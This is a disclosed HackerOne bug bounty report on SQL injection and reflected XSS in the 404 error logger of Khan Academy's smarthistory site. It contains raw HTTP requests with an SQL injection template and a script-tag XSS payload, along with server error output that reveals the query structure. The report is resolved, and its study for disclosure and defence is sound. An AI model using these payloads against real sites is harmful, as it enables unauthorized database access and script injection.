---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '31023'
original_report_id: '31023'
title: Sql injection And XSS
weakness: Cross-site Scripting (XSS) - Generic
team_handle: khanacademy
created_at: '2014-10-11T13:47:27.346Z'
disclosed_at: '2015-12-08T16:47:16.135Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 3
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Sql injection And XSS

## Metadata

- HackerOne Report ID: 31023
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: khanacademy
- Disclosed At: 2015-12-08T16:47:16.135Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi , 
##Sql lnjection
to reproduce the issue make this request  , just copy it to burp repeater and don't add any other headers .

GET /Campin/jeatest' HTTP/1.1
Host: smarthistory.khanacademy.org
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

simple response  : 

INSERT INTO `hzadofss_modx`.`error_404_logger` (url, ip, host, referer, createdon) VALUES ('/Campin/jeatest'','107.23.39.46', 'ec2-107-23-39-46.compute-1.amazonaws.com', '', '2014-10-11 07:51:13')</span></b>

##To confirm Sql 
the error is shown by MODx , the sql injection happens when a user request a page that doesnt exist then MODx log the request with some others details (ip,host..) . 

the following injection works  
/Campin/qsdqsd',(commands here),1,1,1)#    

i couldn't do more tests because there is a timeout  (Error 503 Service Unavailable due to many requests , btw its really a slow server)
   Timeout in transmission from smarthistory.khanacademy.org

## XSS

GET /Campin/jeatest'"><script>alert(4);</script> HTTP/1.1
Host: smarthistory.khanacademy.org
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close

response 

   ing to parse the requested resource:</td></tr>
    <tr><td colspan='3'><b style='color:red;'>&laquo; Execution of a query to the database       failed - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"><script>alert(4);</script>','107.23.39.46', 'ec2-107-23-39-46.compute-1.amazon' at line 1 &raquo;</b></td></tr><tr><td colspan='3'><b style='color:#999;font-size: 9px;'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQL:&nbsp;<span id='sqlHolder'>INSERT INTO `hzadofss_modx`.`error_404_logger` (url, ip, host, referer, createdon) VALUES ('/Campin/jeatest'"><script>alert(4);</script>','107.23.39.46', 'ec2-107-23-39-46.compute-1.amazonaws.com', '', '2014-10-11 08:01:23')</span></b>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
